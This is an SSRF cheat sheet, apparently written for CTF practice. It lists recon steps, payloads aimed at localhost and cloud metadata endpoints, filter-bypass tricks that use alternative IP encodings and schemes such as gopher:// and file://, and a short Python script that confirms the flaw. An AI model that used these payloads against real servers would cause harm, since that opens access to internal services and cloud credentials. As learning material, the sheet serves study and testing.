# Server-Side Request Forgery (SSRF)

## Purpose
Force target servers to make arbitrary HTTP requests to internal networks or external sites.

## Decision Tree
```
Check SSRF style:
 ├── Direct response from target URL returned? -> In-band SSRF
 └── No response, but time delays or connection logs occur? -> Blind SSRF
```

## Recon Checklist
- [ ] Identify features accepting URLs as inputs (e.g. image importers, proxy interfaces, PDF generators).
- [ ] Test parameters carrying domain/IP names.

## Detection Checklist
- [ ] Inject `http://localhost` or `http://127.0.0.1` and check if standard internal interfaces return.
- [ ] Try domain name changes or alternative IP representations to bypass filters.

## Recon Workflow
1. Locate endpoints importing remote resources.
2. Spin up a local HTTP listener using `scripts/http_listener.py`.
3. Point target inputs to the listener IP to confirm callback connectivity.

## Enumeration
- Access cloud metadata endpoints (e.g. `169.254.169.254`).
- Access internal management APIs (e.g. `/admin`, `/status`).
- Scan internal network IP lists for open ports.

## Useful Tools
- `scripts/http_listener.py`
- Burp Suite Collaborator

## Quick Commands
```bash
# Start listener on attacker machine to catch SSRF requests
python3 scripts/http_listener.py 8000
```

## Linux Commands
*(None applicable)*

## Common Payloads
```
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://0x7f000001
```

## Exploitation Workflow
1. Identify vulnerable URL import fields.
2. Set target parameters to internal network IPs.
3. Extract system configuration, cloud access tokens, or internal flags.

## Example CTF Scenario
A web app allows users to fetch a website screenshot by entering a URL. By entering `http://127.0.0.1:8080/admin`, the web server renders the dashboard of a local service only accessible to localhost.

## Python Automation Example
```python
import requests
# Attempt to fetch internal status
url = "http://target.com/fetch?url="
target_ip = "http://127.0.0.1/admin"
r = requests.get(url + target_ip)
if "admin" in r.text.lower():
    print("[+] SSRF vulnerability confirmed! Found Admin interface.")
```

## Common Mistakes
- Relying on DNS records that resolve dynamically during multi-request checks.
- Forgetting header requirements for cloud APIs (like `Metadata-Flavor: Google` for GCP).

## CTF Tips
- Use decimal or hex conversions of `127.0.0.1` to bypass basic regex filters.
- If HTTP protocol fails, try others: `dict://`, `sftp://`, `gopher://`, `file://`.

## References
- OWASP: SSRF
- HackTricks: SSRF
- PayloadsAllTheThings: SSRF
